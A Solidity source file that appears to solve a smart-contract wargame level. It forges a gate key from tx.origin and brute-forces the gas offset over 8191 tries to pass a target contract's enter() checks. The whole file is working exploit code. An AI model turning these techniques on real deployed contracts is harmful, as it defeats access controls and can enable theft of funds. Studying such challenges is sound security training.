// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Gate {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Gateau {
  function pwn(address target, uint gas) public {
    uint64 key = uint64(1 << 62) + uint64(uint16(uint160(tx.origin)));
    Gate(target).enter{gas:81910+gas}(bytes8(key));
  }
}

contract AuFour {
  function pwn(address gate, address gateau) public returns (uint) {
    for (uint i=0; i<8191; i++) {
      try Gateau(gateau).pwn(gate, i) {
        return i;
      } catch {}
    }
    return 0;
  }
}